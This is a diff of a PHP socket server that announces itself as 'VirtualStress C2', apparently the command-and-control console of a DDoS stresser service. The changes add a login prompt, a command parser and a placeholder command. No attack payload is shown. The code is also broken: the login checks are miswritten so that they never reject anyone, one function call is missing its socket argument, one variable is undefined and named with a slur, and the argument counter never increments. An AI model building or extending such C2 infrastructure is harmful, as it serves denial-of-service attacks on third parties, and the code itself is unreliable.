@@ -15,12 +15,15 @@ include("./Auth/crud.php");
 include("./Auth/auth.php");
 ini_set('error_reporting', E_ALL ^ E_NOTICE);
 ini_set('display_errors', 1);
+// error_reporting(E_ERROR | E_PARSE);
 set_time_limit (0);
 
 $crud = new CRUD();
 $config = new STRING();
 $banner = new BANNERS();
 $auth = new AUTH();
+
+$hostn = $config->CNC_Info["Hostname"];
 
 if(count($argv) < 1) die("Error, Missing argument\r\nUsage ". $argv[0]. " <port>");
 $address = file_get_contents("https://api.ipify.org");
@@ -51,19 +54,33 @@ while (true)
 
     if ($newsock = @socket_accept($sock))
     {
-        socket_write($newsock, main_banner(), strlen(main_banner()));
+        socket_write($newsock, $banner->main_banner($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"]), strlen($banner->main_banner($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"])));
         socket_write($newsock, "Welcome To VirtualStress C2!\r\n", strlen("Welcome To VirtualStress C2!\r\n"));
+        socket_getsockname($newsock, $socket_ip, $socket_port);
+        $data = $crud->user($socket_ip, "all");
+        // login($newsock, $data);
+        $inputUSER = getInput($newsock, "Username: ");
+        if(!$inputUSER == explode(",", $data)[0]) {
+            socket_write($newsock, "Incorrect User\r\n", strlen("Incorrect User\r\n"));
+            // socket_close($newsock);
+        }
+
+        $inputPW = getInput("Password: ");
+        if(!$inputPW == explode(",", $data)[2]) {
+            socket_write($newsock, "Incorrect Password!\r\n", strlen("Incorrect Password!\r\n"));
+        }
+        // socket_write($newsock, "Username: ", strlen("Username: "));
+        // $bytes = socket_recv($socket,$buffer,1,MSG_WAITALL);
+
 
         if (is_resource($newsock))
         {
-
-            $User_Info = $crud->USER($argv[1], $argv[2])
-            $config->GetUserInfo($User_Info);
-            socket_write($newsock, "$j>", 2).chr(0);
+            
+            // socket_write($newsock, "$j>", 2).chr(0);
             socket_getpeername($newsock, $client_ip, $client_port);
             socket_getsockname($newsock, $socket_ip, $socket_port);
             echo "Client IP: $client_ip | Client Port: $client_port\r\n";
-            echo "New client connected $j\r\n";
+            echo "New client connected $j\r\n\r\n";
 
             $client[$j] = $newsock;
 
@@ -84,17 +101,69 @@ while (true)
             {
                 if ($string)
                 {
-                    $CurrentMSG["Cmd"] = $string;
-                    if(strpos($string, "SKID") !== false) {
-                        socket_write($k, "TEST", strlen("TEST"));
-                        socket_write($v, "TEST", strlen("TEST"));
+                    
+                    // socket_getpeername($v, $client_ip, $client_port);
+                    
+                    /*
+                    Command Handler
+                    */
+                    $CurrentMSG["Fullcmd"] = $string;
+                    $split_cmd = explode(" ", $string);
+                    $config->CurrentMSG["Cmd"] = $split_cmd[0];
+                    $count = 0;
+                    foreach($split_cmd as $cmmd) {
+                        $config->CurrentMSG["arg"][$count] = $cmmd;
                     }
-                    echo "$k: $string\r\n";
+
+                    /*
+                    END OF COMMAND HANDLER
+                    */
+
+
+                    $User_Info = explode(",", $crud->Get_Current_Info($client_ip))[0];
+                    $username = str_replace("('", "", $User_Info);
+                    $config->GetUserInfo($User_Info);
+                    echo $config->CurrentUser["Username"]. " | ". $config->CurrentUser["IP"]. "\r\n\r\n";
+
+                    /*
+                    Command Checking
+                    */
+
+                    if(strpos($string, "skid") !== false) {
+                        socket_write($v, "TEST 2\r\n$hostn", strlen("TEST 2\r\n$hostn"));
+                    } else {
+                        socket_write($v, "[x] No command found\r\n$hostn", strlen("[x] No command found\r\n$hostn"));
+                    }
+                    echo "$username: $string\r\n\r\n";
+
+                    /*
+                    END OF COMMAND CHECKING
+                    */
                 }
             }
         }
     }
-    sleep(1);
+    // sleep(1);
+}
+
+function login($socket, $info) {
+    $usrname = getInput($socket, "Username: ");
+    sleep(3);
+    $passwd = getInput($socket, "Password: ");
+    $user_info = explode(",", $gay);
+    if($usrname == $user_info[0]) {
+        if($passwd == $user_info[2]) {
+            socket_write($socket, "Successfully signed in, Welcome: ". $usrname, strlen("Successfully signed in, Welcome: ". $usrname));
+        }
+    }
+}
+
+function getInput($socket, $str) {
+    socket_write($socket, $str, strlen($str));
+    $bytes = socket_recv($socket,$buffer,1,MSG_WAITALL);
+    if(!empty($buffer)) {
+        return $buffer;
+    }
 }
 
 // Close the master sockets
